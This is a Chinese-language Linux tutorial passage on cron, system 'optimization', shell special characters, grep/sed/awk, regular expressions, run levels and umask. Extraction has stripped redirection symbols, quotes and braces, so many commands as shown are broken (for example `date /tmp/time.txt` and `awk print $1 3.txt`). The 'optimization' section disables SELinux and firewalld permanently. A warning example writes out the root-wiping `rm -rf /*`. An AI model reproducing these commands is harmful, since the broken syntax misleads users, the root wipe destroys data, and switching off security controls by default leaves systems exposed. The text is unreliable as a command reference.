buff/cache，是内存(英文：memroy)的描述信息，total表示总内存量，free表示可用剩余量，userd表示已经使用的量，buff/cache表示用作缓存，是和磁盘进行读写时的缓存区域，这个参数不用管。# KiB Swap: 0 total, 0 free, 0 used. 1755332 avail Mem ：## Swap表示虚拟内存，这是硬盘分配给内存的一部分空间，为了当内存不足时，临时将硬盘当作内存使用。这个数值是可以自行调整的。一般自动就分配好了，所以我们不用管，实在是内存不够用的时候再加大这个虚拟内存。我现在看的是虚拟机上的虚拟内存，虚拟机不设置虚拟内存,所以显示为0。 swap虚拟内存在windows也内看到： 2.18 定时任务定期执行任务（执行命令），和windows的计划任务是一样的。 2.18.1 查看时间#时间命令 date#查看时间 [root@localhost ~]# date 2021年 07月 23日 星期五 14:38:19 CST[root@localhost ~]# date +%F 2021-07-23[root@localhost ~]# date +%T 14:35:47[root@localhost tmp]# date +%F\\ %T 2022-01-11 10:07:50 2.18.2 修改时间和日期#修改时间和日期 [root@localhost ~]# date -s 20200723 14:40:00 2020年 07月 23日 星期四 14:40:00 CST# 修改时间 [root@localhost ~]# date -s 14:40:00#同步时间，如果时间和当前时间不一致，可以做一下时间同步，来让时间准确起来 systemctl restart chronyd # 一次执行完是有延迟的，等待一会才看到准确时间，前提是我们有网 2.18.3 定时任务的格式#定时任务的格式 * * * * * cmd 分 时 日 月 周 命令 分：0-59 时：0-23 日：0-31 月：1-12 周：1-7#每5分钟执行一次 */5 * * * * #每1小时的01分执行一次 01 */1 * * * #每半个小时执行一次，下面的意思是每小时的00分和30分各执行一次 00,30 */1 * * * #每天晚上8:00执行一次 00 20 * * * #每个月1号晚上8:00执行 00 20 1 * * #每年1月1号晚上8:00执行 00 20 1 1 * #每周1、周三、周五晚上8:00执行一次 00 20 * * 1,3,5 # 几个符号的意思： # * 每分钟 # */5 每5分钟 # 05 第5分钟 # 每秒钟执行的任务，需要单独写脚本，繁琐一些。 2.18.4 查看，编辑定时任务#查看定时任务，遇到特殊符号%,需要添加转义符号\\; [root@localhost ~]# crontab -l * * * * * echo `date +\\%T` /tmp/time.txt #编辑定时任务 [root@localhost ~]# crontab -e * * * * * date /tmp/time.txt # 每分钟执行一次 [root@localhost ~]# crontab -l * * * * * date /tmp/time.txt## 我们可以通过cat来查看任务是否执行了，但是比较麻烦，每次手动输入cat，所以我们可以用如下指令 tail -f /tmp/time.txt #监测文件尾部内容的变化. [root@localhost ~]# tail -f /tmp/time.txt 2023年 03月 24日 星期五 10:58:01 CST 2023年 03月 24日 星期五 10:59:01 CST 2023年 03月 24日 星期五 11:00:01 CST 2023年 03月 24日 星期五 11:01:01 CST # 是这个进程再帮我们执行定时任务： [root@localhost ~]# ps -ef|grep cron root 581 1 0 18:05 ? 00:00:00 /usr/sbin/crond -n # 我们还可以自行重启这个进程 root@localhost ~]# systemctl restart crond [root@localhost ~]# ps -ef|grep cron # 可以看到进程启动时间变化了 root 2611 1 25 21:27 ? 00:00:00 /usr/sbin/crond -n #改为每小时的03分执行 [root@localhost ~]# crontab -e [root@localhost ~]# crontab -l 03 * * * * date /tmp/time.txt #修改一下系统时间 [root@localhost ~]# date -s 12:02:50 2023年 03月 24日 星期五 12:02:50 CST [root@localhost ~]# tail -f /tmp/time.txt ... 2023年 03月 24日 星期五 11:13:01 CST 2023年 03月 24日 星期五 11:14:01 CST 2023年 03月 24日 星期五 12:03:03 CST # 12点03分执行的 # crontab -e里面每一行都可以写一个定时任务，也就是可以写多个定时任务。 # 比如，再加一个热内：每天晚上9:20自动关机# 20 21 * * * shutdown -h now[root@localhost ~]# date -s 21:19:50 2023年 03月 24日 星期五 21:19:50 CST[root@localhost ~]# crontab -l 03 * * * * date /tmp/time.txt 20 21 * * * shutdown -h now[root@localhost ~]# date 2023年 03月 24日 星期五 21:21:03 CST 您在 /var/spool/mail/root 中有邮件# 错误的原因可能是需要我们写shutdown的绝对路径[root@localhost ~]# which shutdown # which也是查找，可以查找指令的绝对路径 /usr/sbin/shutdown# 这里就是想提示大家，如果指令不行，就写指令的绝对路径# 我们发现，没有关闭成功，并且看到了一个提示，有个邮件？我们去看一下### 如果定时任务的格式，或者内容有问题，系统都会发邮件提示： 2.19 系统优化## 现在的操作系统需要优化的地方不多了，甚至直接就可以使用，之前的老系统都需要好多优化才行。我这里简单做一些优化，大家最好和我的一致昂。我们先还原一下快照，优化好之后我们再做一个新的快照。 2.19.1 优化ssh## 优化ssh，以防连接过慢 vi /etc/ssh/sshd_config # 改配置文件之前，最好先做好备份，cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak 79行：GSSAPIAuthentication no 115行：UseDNS no # 别忘了删除前面的注释符号# systemctl restart sshd 2.19.2 优化selinux#修改配置文件，永久关闭vi /etc/selinux/config#第7行修改为SELINUX=disabled需要重启生效#立即生效，临时的 #有时候有些服务器不让重启，就可以先这样临时用一下setenforce 0 2.19.3 关闭firewalldsystemctl stop firewalldsystemctl disable firewalld 2.19.4 安装常用软件yum install lrzsz vim tree wget net-tools screen bash-completion tcpdump -ynet-tools：## 网络相关工具，比如ifconfig、ifconfig ens33(只看某个网卡的ip)，## 查看安装了哪些rpm包， rpm -qa## 具体这个软件有哪些命令 rpm -ql net-tools来查看。screen：##屏幕工具。我们以后可能要远程连接某个服务器，比如服务器在国外，那么我们通过本地xshell等远程连接到目标服务器，那么中间有要经过很多个网络设备的传输，很容易断掉连接，如果我们正在执行某个程序，突然断开连接了，那么我们执行的程序也会自动中断，如果我们不想让程序终端，就可以用到screen命令了。 [root@localhost ~]# screen # 会单独再给我们开启一个终端 [root@localhost ~]# sleep 100 # 然后模拟一下，断开连接，在重新连接回来，还可以通过screen恢复到之前的窗口状态，发现程序还在继续执行着。 [root@localhost ~]# screen -ls There is a screen on: 16389.pts-1.localhost (Detached) 1 Socket in /var/run/screen/S-root. [root@localhost ~]# screen -r 16389 # 恢复窗口# 所以当网络不稳定的时候最好用screen来操作。# bash-completion：这个软件很神奇，叫做超级自动补全。## 这个包安装完之后，要重新登录一下才行。# 这个工具是tab键的加强版，输入-然后再使用tab的时候可以提示我们有哪些参数了，也就是提示信息更全了。 [root@localhost ~]# find /etc/ -size 10k - -amin -ignore_readdir_race -path -anewer -ilname -perm -atime -iname -print# 再比如我们想下载某个软件，我记得好像是psm，然后一个tab键就自动补全包名了 [root@localhost ~]# yum install ps psacct.x86_64 psmisc.x86_64 psutils-perl.noarch psutils.x86_64 # 关于优化，我们就暂时说这么多。[root@localhost ~]# rpm -qa|wc -l # 可以查看一下已经安装的软件包，看看是不是484个。 484# 优化好之后，关机做快照。# tcpdump： 先简单知道一下即可，后续我们还会用它，到时候再详解 # 这是个抓包指令，可以抓取网络传输的数据包。用户可以参考下面几个网址： # https://www.bbsmax.com/A/WpdKENY1JV/ # https://www.codenong.com/cs105816177/ # https://blog.csdn.net/yangshengwei230612/article/details/110878714 # 后面我们会学习其他的抓包工具，比如wireshark、burp suite等等 2.20 服务管理## 服务的操作：开机自启、重启服务、启动服务、停止服务等等。## 安装服务 yum install httpd # 网站服务程序，类似于nginx，它叫做apache# systemctl 是centos7上专门管理服务的命令## 查看服务是否运行了 systemctl status httpd ## 或者 ps -ef | grep httpd## 查看所有服务列表 systemctl list-unit-files 2.20.1 开机自启## 把服务设置为开机启动systemctl enable httpd.service## 取消服务的开机自启systemctl disable httpd.service 2.20.2 重启服务systemctl restart httpd 2.20.3 启动服务systemctl start httpd #start启动 或者 systemctl start httpd.serviceps -ef|grep httpd ## 可以看到服务进程，表示启动了 2.20.4 停止服务systemctl stop httpd #stop停止 2.20.5 查看服务状态## 查看服务状态systemctl status httpd #查看服务状态 httpd是一个网站服务软件，我们通过浏览器访问： 并且可以直接上传一个网站代码，上传到一个特定目录 varwwwhtml 目录下面： 解压： [root@localhost html]# tar zxf youxi.tar.gz [root@localhost html]# lsyouxi youxi.tar.gz[root@localhost html]# ls youxiceshi games icon index index0 index1 index2 index3 index4 index5 index.html[root@localhost html]# 访问： 就可以玩游戏了。 2.21 Linux特殊符号2.21.1 #号#号：注释、备注、批注，系统自动忽略，不执行。 [root@localhost ~]# sdddddddddddddddddddddddddddddddddddddddd -bash: sdddddddddddddddddddddddddddddddddddddddd: 未找到命令 [root@localhost ~]# [root@localhost ~]# # sdddddddddddddddddddddddddddddddddddddddd # 这就不报错了，因为系统不执行被#号注释的内容 # 在linux系统上的指令和配置是通过#号注释的，而开发中，编程语言里面不同的语言也有不同的注释号，比如//、注释内容、#、/**/等等 2.21.2 shell命令中的其他符号2-1 ;命令的分隔符## ;命令的分隔符，通过它可以连接多条指令，一起执行 [root@localhost ~]# touch 111.txt;chmod 777 111.txt [root@localhost ~]# ll 111.txt -rwxrwxrwx 1 root root 0 9月 12 04:40 111.txt 2-2 ..代表上级目录[root@localhost ~]# pwd/root[root@localhost ~]# cd ..[root@localhost /]# pwd/# cd ../../../../../../../../，当..很多时，就会到根目录/ 2-3 .代表当前目录[root@localhost opt]# cp /data/man_db.conf .[root@localhost opt]# lsman_db.conf 2-4 变量和常量 ## 变量，值是不固定的，比如：我的女朋友=xxx，这个xxx不是固定的。我的女朋友就是变量。别人记不住你对象名字的时候，就这么问，你对象呢？而不是直呼其名。 ## 常量，值是固定。圆周率=3.1415926...，固定的值，不会变。 ## env命令可以查看系统内置的环境变量：和windows的环境变量类似。系统变量就是让一些在调用的时候比较麻烦或者说寻找的时候路径比较长的功能变得简单化。系统内部处理时，会根据变量的值做出不同的反应。 [root@localhost ~]# env XDG_SESSION_ID=1 HOSTNAME=localhost.localdomain # 变量作用：比如HOSTNAME这个变量，它的值比较长， ##系统内部程序会经常用到这个值，那么用一个变量存放，以后想用这个值，就用这个变量即可，简单很多，而且只要修改了这个值，其他使用这个变量的地方，值都会跟着变化，方便修改。 TERM=xterm SHELL=/bin/bash HISTSIZE=1000 # 这就是为什么历史命令只记录1000的原因。 SSH_CLIENT=192.168.61.1 50670 22 SSH_TTY=/dev/pts/0 USER=root # 当前登录用户，其他用户登录的时候，这个变量对应的值就变为了其他用户名 LANG=zh_CN.UTF-8 # language的简写，装系统的时候，你安装的英文，这里就是en_US，中文就是zh_CN # 查看某个变量的值 $符号+变量名称： [root@localhost ~]# echo $LANG zh_CN.UTF-8 # 我们改一下语言变量，来看看效果，比如之前命令的参数介绍都是中文的,export用来声明环境变量、修改环境变量等，如下： [root@localhost ~]# usermod --help 用法：usermod [选项] 登录 选项： -c, --comment 注释 GECOS 字段的新值 -d, --home HOME_DIR 用户的新主目录 [root@localhost ~]# export LANG=en_US.UTF-8 [root@localhost ~]# usermod --help # 全部变英文了 Usage: usermod [options] LOGIN Options: -c, --comment COMMENT new value of the GECOS field -d, --home HOME_DIR new home directory for the user account # 也就是说，改动环境变量，会对系统有影响，因为系统中使用这个变量的功能都会随着变量的值而做不同的处理。 2-5 “”双引号，换行，解析变量## 比如：echo，本来只能输出单行文本内容，加上双引号支持换行输入和输出 [root@localhost ~]# echo hello hello [root@localhost ~]# echo hello jaden hello jaden [root@localhost ~]# echo hello jaden jaden.txt # 还可以输出到某个文件中 [root@localhost ~]# cat jaden.txt hello jaden ## 有时候比vi用起来方便。 # 能够解析变量，如下 [root@localhost ~]# echo $LANG en_US.UTF-8 2-6 ‘’单引号，换行，不解析变量# 单引号不能解析变量，其他功能和双引号类似，如下 [root@localhost ~]# echo $LANG $LANG 2-7 \\和# \\ 转义符，反斜杠## / 路径分隔符 2-8 !## 历史命令调用，在find命令中是取反的意思。[root@localhost ~]# history [root@localhost ~]# !47 # 调用历史指令147号 2-9 * 通配符## 我们将find的之后用到过，可以匹配任意字符 [root@localhost ~]# ls *.txt # 查看所有.txt结尾的文件 jaden.txt 2-10 $ 调用变量 [root@localhost ~]# export LANG=en_US.UTF-8 [root@localhost ~]# echo $LANG en_US.UTF-8 [root@localhost ~]# stat 111.txt File: ‘111.txt’ Size: 0 Blocks: 0 IO Block: 4096 regular empty file Device: fd00h/64768d Inode: 33575641 Links: 1 Access: (0777/-rwxrwxrwx) Uid: ( 0/ root) Gid: ( 0/ root) Access: 2021-09-12 04:40:28.399177386 +0800 Modify: 2021-09-12 04:40:28.399177386 +0800 Change: 2021-09-12 04:40:28.400260737 +0800 Birth: - [root@localhost ~]# export LANG=zh_CN.UTF-8 [root@localhost ~]# stat 111.txt 文件：111.txt 大小：0 块：0 IO 块：4096 普通空文件 设备：fd00h/64768d Inode：33575641 硬链接：1 权限：(0777/-rwxrwxrwx) Uid：( 0/ root) Gid：( 0/ root) 最近访问：2021-09-12 04:40:28.399177386 +0800 最近更改：2021-09-12 04:40:28.399177386 +0800 最近改动：2021-09-12 04:40:28.400260737 +0800 创建时间：- # 还有很多指令的帮助信息即便设置了中文，它的帮助信息都是英文，比如curl [root@localhost ~]# curl --help# 因为汉化这个事情，是好多人做的，而且要做很久，但是系统还会更新，还没汉化完，就又更新系统了，还需重新汉化，所以这样不划算，汉化组就解散了，所以有些指令就不汉化了。而且有时候汉化出来的意思和英语本来的意思不同，因为参与汉化的人有些不是计算机专业的，这就很尴尬。 # 使用变量的时候要小心，比如有些人操作变量的时候，删除了根目录，如下 [root@localhost ~]# jaden=/tmp # 定义变量 [root@localhost ~]# echo $jaden # 查看变量值 /tmp [root@localhost ~]# rm -rf $jaden/* # 利用变量做删除，这是删除/tmp目录下的所有内容 # ！！！但是，如果变量名写错了，如下 [root@localhost ~]# rm -rf $jadn/* # 少写了个e字母，系统做删除的时候，找不到这个变量，那么会变成如下效果 [root@localhost ~]# rm -rf /* # 就删除根目录了！！！！！系统崩溃了就。所以看到删除命令，就一定要特别的小心。 2-11 , , , ## 输出重定向## 追加输出重定向## 输入重新定向## 追加输入重定向 2-12 管道 |2-13 ||# 第一个命令失败，才执行第二个命令，第一个指令成功了，不会执行第二个指令 # 指令连接符号，之前说过; 除了它，还有 || 和 ，分号是两个指令都会执行，哪个出错都不影响其他的指令。 [root@localhost ~]# echo 123 || ls 123 [root@localhost ~]# ech 123 || ls -bash: ech: command not found anaconda-ks.cfg jaden.txt 2-14 # 和，两个一起执行，如果第一个失败了，两个都不执行，如果第一个成功了，第二个失败了，就执行第一个，如果两个都成功了，就都执行。 [root@localhost ~]# echo 123 ls 123 anaconda-ks.cfg jaden.txt [root@localhost ~]# ech 123 ls -bash: ech: command not found [root@localhost ~]# echo 123 lx 123 -bash: lx: command not foun 2-15 # 后台运行 # 比如top指令，之前运行top，会占住终端，除非结束top，不然不能执行其他指令 [root@localhost ~]# top [1] 16567 [root@localhost ~]# ps -ef |grep top root 16567 1467 0 16:56 pts/0 00:00:00 top root 16569 1467 0 16:57 pts/0 00:00:00 grep --color=auto top 2-16 ~## 代表家目录，不同的用户家目录不同。 [root@localhost ~]# cd /tmp/ [root@localhost tmp]# cd ~ [root@localhost ~]# cd /tmp [root@localhost tmp]# cd # 其实cd什么参数都不加，也是回到家目录 [root@localhost ~]# 2-17 反引号 # 用来嵌套命令，反引号中的命令先执行 例子1： [root@localhost ~]# mkdir `echo jaden` [root@localhost ~]# ls anaconda-ks.cfg jaden jaden.txt 例子2： [root@localhost opt]# touch test_`date +%T`.txt [root@localhost opt]# ls test_04\\:56\\:22.txt test_04:56:22.txt 例子3： [root@localhost ~]# tar zcf /tmp/etc.tar.gz `find /etc -type f -name *.conf` tar: Removing leading `/ from member names [root@localhost ~]# ls /tmp/ etc.tar.gz [root@localhost ~]# tar tf /tmp/etc.tar.gz # 查看压缩包里面的文件内容 2.22 三剑客## 三剑客就是三个强大的命令。后期讲应急溯源的时候会用到。grep用的最多，所以我们重点讲解这个指令。三剑客配合正则表达式可以发挥很牛的作用。 2.22.1 grep#擅长过滤，或者说查找，按行来过滤## 例子：/var/log/secure是记录用户登录系统的行为的，登录成功还是失败，系统都会自动记录这次登录动作。 [root@localhost ~]# grep Failed password /var/log/secure Mar 25 18:20:48 localhost sshd[16905]: Failed password for root from 192.168.61.1 port 55577 ssh2 # 如果我们想将所有登录失败的ip地址找出来，可以再次过滤# 比如查看某个ip地址登录了多少次[root@localhost ~]# grep Failed password /var/log/secure|grep 192.168.61.1 |wc -l 3# 可以借助正则表达式来进行过滤，可以将内容过滤的很精确，有些在线的网站也可以帮我们生成一些常用的正则表达式，比如https://www.hake.cc/tools/regexcode/ [root@localhost ~]# grep Failed password /var/log/secure|grep --color -P (25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\. (25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d) Mar 25 18:20:48 localhost sshd[16905]: Failed password for root from 192.168.61.1 port 55577 ssh2# ip地址都标红色了，表示匹配出来了。# 如果只要ip地址-Po [root@localhost ~]# grep Failed password /var/log/secure|grep --color -Po (25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\. (25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d) 192.168.61.1 # 有些ip地址是重复的，因为尝试登录了很多次，那么可以先排序，再去重，来查看ip地址[root@localhost ~]# grep Failed password /var/log/secure|grep --color -Po (25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d2|[1-9]?\\d) |sort -n |uniq -c 2 192.168.2.113 3 192.168.2.116 1 192.168.61.1# 比如，如果看到了这么个ip地址164.90.232.121、164.90.232.241等尝试登录了你上千上万次，就是在爆破攻击我们，百度一查，德国的# 我们可以直接拉黑这个ip地址，也叫做加黑，加入黑名单的意思，这个等后面我再教大家。# 为了演示下面的参数，我们先创建一个示例环境，也就是一个练习文件： [root@localhost log]# cd /root/ [root@localhost ~]# head -50 /etc/services test.txt [root@localhost ~]# ls2.txt anaconda-ks.cfg jaden jaden17:52:30.txt jaden.txt test.txt xx.txt #grep参数## -n 显示行号 [root@localhost ~]# grep -n tcp test.txt # vi test.txt +48，表示进入vi的时候，光标直接定位的48行起始位置。## -c 对结果行计数 [root@localhost ~]# grep -c tcp test.txt 14## -i 不区分大小写 [root@localhost ~]# grep -n tcp test.txt -i ## -v 反向搜索，取反 [root@localhost ~]# grep -n udp test.txt -v # 将不含有udp的行全部过滤出来 ## -w 精准匹配 [root@localhost ~]# grep -w tcp test.txt ##-o 只显示匹配的结果，前面的第一个示例中我们用过-o参数 [root@localhost ~]# grep -o -n tcp test.txt ## -A1 同时打印搜索结果行的后一行 ，A是after的简写 [root@localhost ~]# grep -A2 ftp test.txt [root@localhost ~]# grep -A 2 ftp test.txt ## -B3 同时打印搜索结果行的前三行，B是before的简写 [root@localhost ~]# grep -B2 ftp test.txt ## -C2 同时打印搜索结果行的上下各两行 [root@localhost ~]# grep -C2 ftp test.txt ## -E 扩展正则表达式 # 正则我们下面会细讲，先简单了解一下。 [root@localhost ~]# grep -E .tp test.txt # .就是正则表达式，表示任意的一个字符 [root@localhost ~]# grep -E ftp|ssh test.txt # 查找ftp或者ssh，|是或者的意思，可以用多个ftp|ssh|telnet... ## -P 使用perl正则 # perl语言中设计的正则表达式写法规则，很强大，很多领域都支持perl正则的语法结构。 [root@localhost ~]# grep -P \\d+ test.txt # 匹配所有的数字 [root@localhost ~]# grep -P \\d4, test.txt #匹配4位的数字 2.22.2 sed#擅长取行和修改替换## 用法：sed [-nri] [动作] 目标文件文件## 选项与参数：-n ： ##使用安静(silent)模式。在一般 sed 的用法中，所有来自 STDIN 的数据一般都会被列出到终端上。但如果加上 -n 参数后，则只有经过sed 特殊处理的那一行(或者动作)才会被列出来。-r ：## sed 的动作支持的是延伸型正则表示法的语法。(默认是基础正则表示法语法)-i ：## 直接修改读取的文件内容，而不是输出到终端。动作说明： [n1[,n2]]function n1, n2一般表示为行号，[,n2]表示这个参数可选，可有可无。function： a ：## 指定行后面插入一行 d ：## 删除 i ：## 指定行前面插入一行 p ：## 打印，一般和前面的-n参数一起用 s ：## 替换 需要I忽略大小写，全局替换需要gsed过滤 # sed也可以进行过滤，如下简单示例 [root@localhost ~]# seq 5 1.txt [root@localhost ~]# vi 1.txt # 修改为如下内容 [root@localhost ~]# cat 1.txt 1 2c 3a 4b 5a [root@localhost ~]# sed /a/p 1.txt #默认会将所有行都打印出来，并且匹配到的a所在的行重新打印一遍 1 2c 3a 3a 4b 5a 5a [root@localhost ~]# sed -n /a/p 1.txt # 加上-n，进入安静(silent)模式，就不会将所有内容打印出来了。 3a 5a # sed过滤相比grep来说，就比较麻烦。所以，过滤我们一般用grep。 [root@localhost ~]# sed -n /tcp/p test.txt # 也能过滤出tcp所在的行 这个我们用的其实很少，所以大家简单学习一下即可。 2-1 删除匹配行数据# sed删除匹配的行数据 [root@localhost ~]# sed /tcp/d test.txt # 删除所有带tcp的行，并不是删除原文件中的数据，而是将删除之后的结果打印出来了。 # 所以只需要一个重定向，就拿到删除之后的结果了 [root@localhost ~]# sed /tcp/d test.txt 2.txt [root@localhost ~]# cat -n 2.txt # -i就可以直接删除原文件的数据 [root@localhost ~]# sed -i /tcp/d test.txt [root@localhost ~]# cat -n test.txt [root@localhost ~]# sed -i /udp/d test.txt [root@localhost ~]# cat -n test.txt [root@localhost ~]# sed /^#/d test.txt # 删除以#开头的行，^表示以什么开头的正则表达式，我没有加-i昂 2-2 指定行来删除# 指定行号来删除 [root@localhost ~]# sed 1,10d test.txt # 删除1-10行的数据 [root@localhost ~]# sed -i 1,10d test.txt # 只要1-5行的数据 [root@localhost ~]# sed -n 1,5p test.txt # 只要第5行的数据 [root@localhost ~]# sed -n 5p test.txt 2-3 插入数据# 插入数据 # 在第三行后面插入一行数据 [root@localhost ~]# sed 3a hello jaden 1.txt 1 2c 3a hello jaden 4b 5a # 在第2行前面插入一行数据 [root@localhost ~]# sed 2i hello jaden 1.txt 1 hello jaden 2c 3a 4b 5a # 加上-i参数就能直接修改原文件 [root@localhost ~]# sed -i 2i hello jaden 1.txt [root@localhost ~]# cat 1.txt 1 hello jaden 2c 3a 4b 5a 2-4 替换数据# 替换数据 # 把3a替换成wuLAOBAN [root@localhost ~]# sed s#3a#wuLAOBAN# 1.txt 1 hello jaden 2c wuLAOBAN 4b 5a [root@localhost ~]# sed -i s#3a#wuLAOBAN# 1.txt [root@localhost ~]# cat 1.txt 1 hello jaden 2c wuLAOBAN 4b 5a # 把A替换成xxx，每行只替换一次，同一行的第二个及之后的A都不进行替换 [root@localhost ~]# sed s#A#xxx# 1.txt 1 hello jaden 2c wuLxxxOBAN 4b 5a # 把所有的A都替换成xxx [root@localhost ~]# sed s#A#xxx#g 1.txt 1 hello jaden 2c wuLxxxOBxxxN 4b 5a # 把所有的A和a都替换成xxx，忽略大小写，参数I [root@localhost ~]# sed s#A#xxx#gI 1.txt 1 hello jxxxden 2c wuLxxxOBxxxN 4b 5xxx # -r参数也是和正则搭配来用的，grep是-E和-P参数，我们讲完正则之后再说。 2.22.3 awk#擅长取列## 用法，取列## 比如3.txt内容如下： 2 this is a test 3 Do you like awk Thiss a test 10 There are orange,apple,mongo ## 例子1： 取列 [root@localhost ~]# vi 3.txt [root@localhost ~]# cat 3.txt 2 this is a test 3 Do you like awk Thiss a test 10 There are orange,apple,mongo [root@localhost ~]# awk print $1 3.txt 2 3 Thiss 10 [root@localhost ~]# awk print $3 3.txt # 取第三列 [root@localhost ~]# awk print $NF 3.txt # 取每一行的最后一列，NF是固定写法 test awk test orange,apple,mongo [root@localhost ~]# awk print $1,$NF 3.txt # 取第一列和最后一列 2 test 3 awk Thiss test 10 orange,apple,mongo [root@localhost ~]# awk print $NF,$1 3.txt # 还可以反着写，所以通过awk，可以将列顺序重新排版 [root@localhost ~]# awk print $1,$4 jaden.txt # 取出第一列和第四列 ## 例子2：计算 vi 4.txt，写上如下内容 # 水果，每斤多少钱，总共多少斤 orange 10 20 apple 20 30 mongo 50 10 banana 5 200 # 开始计算 [root@localhost ~]# awk print $1,$2*$3 4.txt orange 200 apple 600 mongo 500 banana 1000 # 还可以加备注信息： [root@localhost ~]# awk print $1总价为：,$2*$3元 4.txt orange总价为： 200元 apple总价为： 600元 mongo总价为： 500元 banana总价为： 1000元 # 例子3：根据行号来筛选内容 # a = 1表示变量赋值，让a=1 # a == 1，表示判断一下a的值是不是等于1，等于1那么条件判断结果为真，不等1那么条件判断结果为假 # 支持符号： == = = [root@localhost ~]# awk NR==1 4.txt # 取出第一行数据，grep不会取出特定的行，只能筛选某些行 orange 10 20 [root@localhost ~]# awk NR2 4.txt # 取出行号大于2的行数据 mongo 50 10 banana 5 200 [root@localhost ~]# awk NR=3 4.txt # 取出行号小于等于3的行数据 orange 10 20 apple 20 30 mongo 50 10 [root@localhost ~]# awk NR=3 NR1 4.txt # 取出行号大于1并且小于等于3的行 apple 20 30 mongo 50 10 # 还可以取行的同时来取列 [root@localhost ~]# awk NR=3print $1 4.txt orange apple mongo # 例子4： # 还可以过滤出指定的行，awk也能做过滤，但是 [root@localhost ~]# awk /apple/ 4.txt # 取出含有apple数据的行数据 apple 20 30 # grep、sed、awk过滤对比 grep apple 4.txt sed -n 1,2p 4.txt awk NR1 NR=3 4.txt # 例子5： # 再比如我们刚才取ip地址：比直接写正则要方便很多 [root@localhost log]# grep Failed password secure Mar 25 18:20:48 localhost sshd[16905]: Failed password for root from 192.168.61.1 port 55577 ssh2 Mar 25 18:49:26 localhost sshd[1498]: Failed password for root from 192.168.2.113 port 49991 ssh2 [root@localhost log]# grep Failed password secure|awk print $11 192.168.61.1 192.168.2.113 192.168.2.116# 例子6： 指定分隔符，默认是按照空格作为分隔符的 awk -F : print $7,$1 /etc/passwd # 这个文件都是用:做的分隔符 [root@localhost ~]# awk -F : NR==3 || NR==5 print $1 /etc/passwd # 取出第三行和第五行的第一列数据，分隔符为: daemon lp # 表示and，两个条件同时成立 # ||表示or，满足一个条件即可 # 例子7： 拼凑指定文本,双引号之间原样输出 # awk -F : print $1:123:$7 /etc/passwd [root@localhost ~]# awk -F : print $1:123:$7 /etc/passwd root:123:/bin/bash bin:123:/sbin/nologin # 例子8: 过滤文本 # awk -F [ /]+ $2~/^47/ 1.txt # 找出第一列数据中带h的，并取出第一列和第七列的数据 [root@localhost ~]# awk -F : $1~/h/print $1,$7 /etc/passwd shutdown /sbin/shutdown halt /sbin/halt sshd /sbin/nologin chrony /sbin/nologin apache /sbin/nologin 2.23 正则表达式1) ^ ## 表示搜索以什么开头。2) $ ## 表示搜索以什么结尾。3) ^$ ##表示空行，不是空格。4) . ## 代表且只能代表任意一个字符。5) \\ ## 转义字符，让有着特殊身份意义的字符，脱掉马甲，还原原型。 ## 例如：\\.只表示小数点，还原原始小数点的意义。6) * ## 重复0个或多个前面的一个字符。不代表所有了。7) .* ## 匹配所有的字符。^.* 任意多个字符开头。8) [abc] ## 匹配字符集合内任意一个字符[a-z]9) [^abc] ## ^再中括号里面表示非，不包含a或b或c。10) n,m ## 重复n到m次，前一个字符。11） + ## 重复1次到多次12） ？ ## 重复0次到多次 2.23.1 取ip的例子：ip addr|grep -Eo [0-9]1,3\\.[0-9]1,3\\.[0-9]1,3\\.[0-9]1,3|sed -n 2pgrep Failed password secure |grep -Eo [0-9]1,3\\.[0-9.]+ 2.23.2 取root用户登录时间lastlog|sed -n /root/p|grep -Eo [0-9]2:[0-9]2:[0-9]2 2.24 Linux运行级别## 运行级别 0 关机## 运行级别 1 单用户 ，这个类似于windows安全模式，可以用于找回密码等操作。## 运行级别 2 不带网络的多用户 ，这种是不能联网的。## 运行级别 3 完整的多用户模式 multi-user.target ， 我们平常使用的模式## 运行级别 4 保留## 运行级别 5 桌面模式 graphical.target ， 桌面版系统就是这个模式，如果不想开机进入图形化界面，就需要修改运行级别，可以试一下## 3运行级别 6 重启## centos6是通过数字来设置，centos7都不是用数字了，而是用下面的方式，不过数字设置依然有效： 2.24.1 查看运行级别#切换运行级别 init # 执行init 6，就会重启，执行init 0就会关机 2.24.2 查看运行级别## 查看运行级别 runlevelsystemctl get-default ##设置运行级别，设置之后一重启就改变了 systemctl set-default graphical.target #设置默认运行级别为图形，注意没有安装图形化界面## 工具的话是不能切换为桌面版的 systemctl set-default multi-user.target #设置默认运行级别为命令行 2.24.3 单用户模式修改密码## 平时用不到，用到的时候网上搜一下即可 2.24.4 权限掩码## 查看掩码值umask[root@localhost ~]# umask 0022 ## 这个值就决定着我们创建文件的初始权限，比如我们创建个目录和文件，如下 [root@localhost ~]# mkdir jaden [root@localhost ~]# touch wulaoban.txt [root@localhost ~]# ll -h 总用量 4.0K -rw-------. 1 root root 1.3K 3月 15 20:14 anaconda-ks.cfg drwxr-xr-x 2 root root 6 3月 27 09:29 jaden -rw-r--r-- 1 root root 0 3月 27 09:29 wulaoban.txt# 可以看到，目录的初始权限为755，文件的初始权限为644。这些权限都是通过umask掩码计算得来的。# 文件权限计算：0666-0022 = 0644# 目录权限计算：0777-0022 = 0755## 我们还可以修改掩码值来控制初始文件和文件夹的权限： #修改文件vim /etc/profile，找到umask来修改 root 默认权限掩码 022 普通用户 默认权限掩码 002 比如我们先修改一下root的权限掩码，改为044先看看效果。 保存退出，然后重新登录一下就生效了，再看umask的值 再次创建文件，看一下初始权限。 [root@localhost ~]# touch wu1.txt[root@localhost ~]# mkdir ja1[root@localhost ~]# ll -h 总用量 4.0K -rw-------. 1 root root 1.3K 3月 15 20:14 anaconda-ks.cfg drwx-wx-wx 2 root root 6 3月 27 09:38 ja1 drwxr-xr-x 2 root root 6 3月 27 09:29 